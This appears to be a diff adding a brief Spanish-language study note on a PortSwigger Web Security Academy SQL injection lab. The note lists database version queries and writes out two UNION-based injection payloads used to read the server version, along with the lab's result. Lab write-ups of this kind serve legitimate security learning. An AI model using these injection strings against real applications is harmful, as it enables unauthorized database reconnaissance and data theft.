@@ -1,0 +1,28 @@
+>>>>>>>>Portswigger
+>>>>>SQL injection "union attack"
+>>>Lab 7
+
+En este laboratorio tenemos que descubrir cual es la version de servidor MySQL/Microsoft
+
+la informacion que nos provee 
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+es la siguiente:
+
+Oracle		SELECT banner FROM v$version
+		SELECT version FROM v$instance
+
+Microsoft	SELECT @@version
+
+PostgreSQL	SELECT version()
+
+MySQL		SELECT @@version
+
+Y como en el anterior ejersicio utilizamos 
+	> 'union select NULL, banner FROM v$version-- -
+
+En este caso haremos lo mismo, pero con MySQL
+	> 'union select NULL, @@version-- -
+
+El laboratorio se resolvio correctamente y la informacion encontrada fue la siguiente:
+
+8.0.32-0ubuntu0.20.04.2
